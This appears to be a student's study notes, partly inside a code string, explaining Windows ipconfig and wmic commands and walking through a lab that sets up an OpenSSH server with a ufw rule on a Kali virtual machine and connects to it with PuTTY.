#ipconfig/displaydns
#The command "ipconfig /displaydns" is used in Windows systems to show the contents of the
#Domain Name System (DNS) resolver cache. This cache stores information about recently resolved
#DNS queries, including the corresponding IP addresses.



#ipconfig/all
#The command "ipconfig /all" is used in Windows systems to display detailed information about
#network interfaces, including their configurations and current network settings.



#ipconfig/flushdns
#The command "ipconfig /flushdns" is used in Windows systems to clear the DNS resolver cache.
#This cache stores information about previously resolved DNS queries, and flushing it can be helpful
#in troubleshooting DNS-related issues or when you want to force your computer to re-query DNS
#servers for domain name resolution.



#wmic os get osarchitecture
#The command "wmic os get osarchitecture" is used in Windows systems to retrieve information
#about the operating system architecture. When you run this command in the Command Prompt, it
#will return the architecture of the operating system, either 32-bit or 64-bit.

var text12 = ` # 12 Putty SSH

# Step 1 - Since we are Performing the Practical in our virtual machine be sure to check whether Our Network is “Bridged” i.e., the kali network works independently and has its own IP address. We’ll be using
# “ifconfig” Command to check the IP address.
# ifconfig

# Step 2: - To check the IP Address from Windows command prompt.
# ipconfig

# Step 3 - Let’s create a folder to access remotely.
# Commands: -
#  cd /home: This Command helps us to change the directory to home folder  “cd /{folder_name}”
#  mkdir /testfile: This command will create a folder “mkdir /{Folder_Name}”

# cd /home
# mkdir testfile
# cd testfile/

# Step 4 - Now we’ll create a text file in the folder that we’ve created. Once created we can insert any text in that file.
# Commands: -
# cat > xyz.txt
# Heyy Shipra!
#  "CTRL+D" to save the file.

# Step 5 - Now we’ll be checking the upgradable packages and upgrading necessary dependencies.
# apt update
# - this command allows us to check the available updates and set the dependence tree.

# Step 6 - We will install the Open SSh server in our kali to get capability to remotely access the terminal.
# We can install using “apt install openssh-server” command.
# apt install openssh-server

# Step 7 - Install ufw for security creating rules for network and check the status where it’ll show us the availability of the firewall and the rules applied.
# Commands: -
# apt install ufw            : To install ufw in kali.
# ufw status                 : show the status of the firewall by default ufw status is disabled.
# ufw enable                 : this command is to enable the firewall.

# Step 8 - Let’s add rule on our firewall by using “ufw allow 22/tcp”. The port (22) is used for Secure Shell
# (SSH) communication and allows remote administration access to the VM. In general, traffic is encrypted using password authentication.
# ufw allow 22/tcp

# Step 9 - Now we’ll start the server so that we can remotely access the terminal and check the status if the server is up and running.
# Command: -
# service ssh start             : This command starts the server on the IP address and port 22 which is rule which we have set above.
# service ssh status            : This will give the update and status of the server if its Running or down

# service ssh start 
# service ssh status

# Step 10 - Now we’ll start putty and provide IP address of our kali machine and the port i.e. 22, connection type will SSH and select telnet.

# Step 11: - After it is connected, we’ll be prompted to enter the kali credentials to access the terminal.
# ip - 192.168.0.103   port - 22

# Step 12: - After Logging in We can access the terminal and access the file which we have created.
